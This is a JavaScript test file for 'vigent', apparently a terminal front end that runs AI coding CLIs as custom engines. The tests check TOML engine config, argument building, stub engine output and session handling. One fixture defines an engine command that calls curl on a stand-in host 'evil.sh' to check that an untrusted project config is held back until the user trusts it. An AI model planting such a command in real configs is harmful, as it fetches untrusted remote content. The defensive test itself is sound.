import assert from "node:assert/strict";
import { execFileSync } from "node:child_process";
import * as fs from "node:fs";
import * as os from "node:os";
import * as path from "node:path";
import { after, test } from "node:test";
import { modelChoices } from "../dist/choices.js";
import { adapterFor, CliSession } from "../dist/cli-engines.js";
import { loadConfig, PROJECT_CONFIG } from "../dist/config.js";
import { CUSTOM_ENGINES, ENGINE_NAMES, isEngineId, quickEngines } from "../dist/engines.js";
import { Tty } from "./support/terminal.mjs";

const tmp = fs.realpathSync(fs.mkdtempSync(path.join(os.tmpdir(), "vigent-custom-")));
after(() => fs.rmSync(tmp, { recursive: true, force: true }));
const write = (name, text, mode) => {
	const f = path.join(tmp, name);
	fs.mkdirSync(path.dirname(f), { recursive: true });
	fs.writeFileSync(f, text);
	if (mode) fs.chmodSync(f, mode);
	return f;
};
const settle = async (s) => {
	for (let i = 0; i < 300 && s.state === "running"; i++) await new Promise((r) => setTimeout(r, 20));
};

// a stand-in "gemini": prints its arguments, then a reply in plain text
const bin = path.join(tmp, "bin");
write("bin/gemini", `#!${process.execPath}\nconst a = process.argv.slice(2);\nif (a.includes("--fail")) { console.error("quota exceeded"); process.exit(2); }\nprocess.stdout.write("args: " + JSON.stringify(a) + "\\n\\nThe badge counts lines.\\nIt should sum quantities.");\n`, 0o755);
// a stand-in that speaks Claude Code's JSON
write("bin/claudish", `#!${process.execPath}\nprocess.stdout.write(require("fs").readFileSync(${JSON.stringify(path.join(import.meta.dirname, "fixtures", "claude-tool.jsonl"))}, "utf8"));\n`, 0o755);

test("[engines.<id>] with a command defines an engine; engine = can name it before the table", () => {
	const f = write(
		"config.toml",
		`engine = "gemini"\n[engines.gemini]\nname = "Gemini CLI"\ncommand = ["gemini", "--yolo", "-p", "{prompt}"]\nmodel_args = ["-m", "{model}"]\nmodels = ["gemini-2.5-pro", "gemini-2.5-flash"]\n[engines.claudish]\ncommand = ["claudish"]\noutput = "claude"\n[engines.broken]\ncommand = "gemini -p"\n[engines.odd]\ncommand = ["x"]\noutput = "xml"\ncolor = "red"\n[engines.nope]\nmodel = "x"\n`,
	);
	const { config, warnings } = loadConfig(f);
	assert.equal(config.engine, "gemini");
	assert.ok(isEngineId("gemini") && isEngineId("claudish"));
	assert.equal(ENGINE_NAMES.gemini, "Gemini CLI");
	assert.deepEqual(CUSTOM_ENGINES.get("gemini"), {
		id: "gemini",
		name: "Gemini CLI",
		command: ["gemini", "--yolo", "-p", "{prompt}"],
		output: "text",
		modelArgs: ["-m", "{model}"],
		models: ["gemini-2.5-pro", "gemini-2.5-flash"],
	});
	assert.deepEqual(warnings, [
		`config [engines.broken]: 'command' should be the program and its arguments, e.g. ["gemini", "-p", "{prompt}"]`,
		`config [engines.odd]: 'output' should be "text", "claude", "codex", "opencode", "gemini", "cursor"`,
		"config [engines.odd]: unknown option 'color' (name, command, output, model_args, models, resume_args)",
		"config: unknown engine [engines.nope] (pi, claude, codex, opencode, gemini, cursor, or give it a command = [...] to add your own)",
	]);

	// in a project's .vigent.toml, a command waits for :trust like hooks do
	const p = write("repo/.vigent.toml", `[engines.sneaky]\ncommand = ["curl", "evil.sh"]\n`);
	const r = loadConfig(p, { base: config, trusted: false, label: PROJECT_CONFIG });
	assert.deepEqual(r.gated, ["engines.sneaky.command"]);
	assert.equal(isEngineId("sneaky"), false);
});

test("the command: {prompt} where you put it (or at the end), {model} through model_args", () => {
	const a = adapterFor("gemini");
	assert.equal(a.raw, true);
	assert.deepEqual(a.args("fix it", { cwd: tmp }), ["--yolo", "-p", "fix it"]);
	assert.deepEqual(a.args("fix it", { cwd: tmp, model: "gemini-2.5-pro" }), ["--yolo", "-p", "fix it", "-m", "gemini-2.5-pro"]);
	assert.deepEqual(adapterFor("claudish").args("hi", { cwd: tmp, extraArgs: ["--x"] }), ["--x", "hi"], "no {prompt}: it goes at the end");
	assert.equal(adapterFor("claudish").raw, false);
	assert.deepEqual(adapterFor("claudish").args("more", { cwd: tmp, resumeId: "abc" }), ["more"], "no resume_args: nothing to continue with");
});

test("a plain-text engine: what it prints is the reply; a failure says why", async () => {
	const env = { ...process.env, PATH: `${bin}${path.delimiter}${process.env.PATH}` };
	const s = new CliSession("badge", "gemini", undefined, { cwd: tmp, env });
	assert.equal(s.model, "Gemini CLI");
	s.send("why is the badge wrong?");
	await settle(s);
	assert.equal(s.state, "idle");
	assert.equal(s.items.at(-1).kind, "agent");
	assert.equal(s.items.at(-1).text, 'args: ["--yolo","-p","why is the badge wrong?"]\n\nThe badge counts lines.\nIt should sum quantities.');

	const f = new CliSession("fails", "gemini", undefined, { cwd: tmp, env, extraArgs: ["--fail"] });
	f.send("go");
	await settle(f);
	assert.equal(f.state, "error");
	assert.ok(f.items.some((i) => /quota exceeded/.test(i.text)));
});

test("output = \"claude\": a CLI that prints Claude Code's JSON gets tool calls and usage too", async () => {
	const env = { ...process.env, PATH: `${bin}${path.delimiter}${process.env.PATH}` };
	const s = new CliSession("tools", "claudish", undefined, { cwd: tmp, env });
	s.send("write hello.txt");
	await settle(s);
	assert.equal(s.state, "idle");
	assert.ok(s.items.some((i) => i.kind === "tool" && i.tool.name === "Write"));
	assert.ok(s.tokens > 0);
	assert.equal(s.resumeId, undefined, "no resume_args: the conversation id isn't kept");
});

test("resume_args: a JSON engine continues its conversation", async () => {
	loadConfig(write("resume.toml", `[engines.claudish2]\ncommand = ["claudish"]\noutput = "claude"\nresume_args = ["--resume", "{id}"]\n`));
	assert.deepEqual(adapterFor("claudish2").args("more", { cwd: tmp, resumeId: "abc" }), ["--resume", "abc", "more"]);
	const env = { ...process.env, PATH: `${bin}${path.delimiter}${process.env.PATH}` };
	const ids = [];
	const s = new CliSession("tools", "claudish2", undefined, { cwd: tmp, env, onResumeId: (id) => ids.push(id) });
	s.send("write hello.txt");
	await settle(s);
	assert.ok(s.resumeId);
	assert.deepEqual(ids, [s.resumeId]);
});

test("custom engines show up where engines are listed: detection and :model", async () => {
	const env = { PATH: bin };
	const info = quickEngines(env).find((e) => e.id === "gemini");
	assert.deepEqual([info.name, info.installed, info.connected, info.detail], ["Gemini CLI", true, true, "from your config · runs gemini"]);
	const missing = quickEngines({ PATH: "" }).find((e) => e.id === "gemini");
	assert.deepEqual([missing.installed, missing.detail], [false, "gemini isn't on PATH"]);
	assert.deepEqual((await modelChoices("gemini")).map((c) => c.value), ["default", "gemini-2.5-pro", "gemini-2.5-flash"]);
});

test("the real vigent runs a custom engine from config.toml", { timeout: 60000 }, async () => {
	const repo = path.join(tmp, "shop");
	fs.mkdirSync(repo);
	execFileSync("git", ["init", "-q", "-b", "main"], { cwd: repo });
	fs.writeFileSync(path.join(repo, "README.md"), "# shop\n");
	execFileSync("git", ["add", "."], { cwd: repo });
	execFileSync("git", ["-c", "user.email=a@b", "-c", "user.name=t", "commit", "-qm", "init"], { cwd: repo });
	const cfg = path.join(tmp, "xdg");
	write("xdg/vigent/config.toml", `engine = "gemini"\n[engines.gemini]\nname = "Gemini CLI"\ncommand = ["gemini", "-p", "{prompt}"]\n`);
	const env = { ...process.env, PATH: `${bin}${path.delimiter}${process.env.PATH}`, XDG_CONFIG_HOME: cfg, XDG_STATE_HOME: path.join(tmp, "state"), RIFTRI_BINARY: path.join(tmp, "none"), TERM: "xterm-256color" };
	const t = new Tty([], { cwd: repo, env, cols: 130, rows: 30 });
	try {
		await t.waitFor(/● Gemini CLI/);
		await t.type("i");
		await t.type("why is the badge wrong?\r");
		await t.waitFor(/It should sum quantities\./);
		assert.match(t.screen(), /Gemini CLI/, "the winbar names the engine");
	} finally {
		t.kill();
	}
});
